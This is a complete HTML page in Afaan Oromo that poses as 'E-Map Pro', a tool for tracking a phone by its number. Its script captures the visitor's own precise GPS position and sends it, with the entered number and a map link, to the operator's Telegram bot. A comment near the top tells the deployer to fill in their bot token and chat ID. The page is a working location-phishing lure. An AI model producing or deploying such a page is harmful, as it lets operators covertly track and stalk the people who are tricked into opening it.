<!DOCTYPE html>
<html lang="om">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Map Pro Tracker</title>
    <style>
        body {
            font-family: sans-serif;
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #ffffff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 { color: #1a73e8; margin-top: 0; }
        p { color: #555; font-size: 14px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
            margin-bottom: 15px;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }
        button:hover { background: #1557b0; }
        #status { margin-top: 15px; font-size: 14px; color: #333; }
    </style>
</head>
<body>

    <div class="card">
        <h2>📍 E-Map Pro</h2>
        <p>Maaloo lakkoofsa bilbilaa keessan galchuun itti fufaa:</p>
        
        <form onsubmit="trackPhone(event)">
            <input type="tel" id="phone" placeholder="Fkn: 0911223344" required>
            <button type="submit" id="btn">Track Godhi</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        // --- ASITTI BOT TOKEN FI CHAT ID KEE GALCHI ---
        const BOT_TOKEN = "GARTI_BOT_TOKEN_KEE_AS_ITTI_GALCHI"; 
        const CHAT_ID = "CHAT_ID_KEE_AS_ITTI_GALCHI";         

        function trackPhone(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const status = document.getElementById('status');
            const btn = document.getElementById('btn');

            status.textContent = "⏳ Eeyyama GPS gaafachaa jira...";
            btn.disabled = true;

            if (!navigator.geolocation) {
                alert("Browser kee GPS hin deeggaru!");
                btn.disabled = false;
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

                    status.textContent = "✅ Milkaa'inaan ergameera!";
                    sendToTelegram(phone, lat, lng, mapLink);
                },
                (err) => {
                    status.textContent = "❌ Eeyyamni GPS hin kennamne.";
                    alert("Maaloo bakka jirtan beekuuf eeyyama (Allow) kennaa!");
                    btn.disabled = false;
                },
                { enableHighAccuracy: true }
            );
        }

        function sendToTelegram(phone, lat, lng, mapLink) {
            if (BOT_TOKEN.includes("GARTI_BOT_TOKEN")) {
                alert(`Bilbila: ${phone}\nLat: ${lat}\nLng: ${lng}`);
                location.reload();
                return;
            }

            const text = `🚨 <b>NEW TRACKER ALERT!</b>\n\n` +
                         `📱 <b>Bilbila:</b> ${phone}\n` +
                         `📍 <b>Lat:</b> ${lat}\n` +
                         `📍 <b>Lng:</b> ${lng}\n` +
                         `🗺️ <a href="${mapLink}">Google Map Irraa Ilaali</a>`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            })
            .then(res => res.json())
            .then(data => {
                alert("Galmeen milkaa'e!");
                location.reload();
            })
            .catch(err => {
                alert("Erguu irratti rakkoo uumame.");
                document.getElementById('btn').disabled = false;
            });
        }
    </script>
</body>
</html>
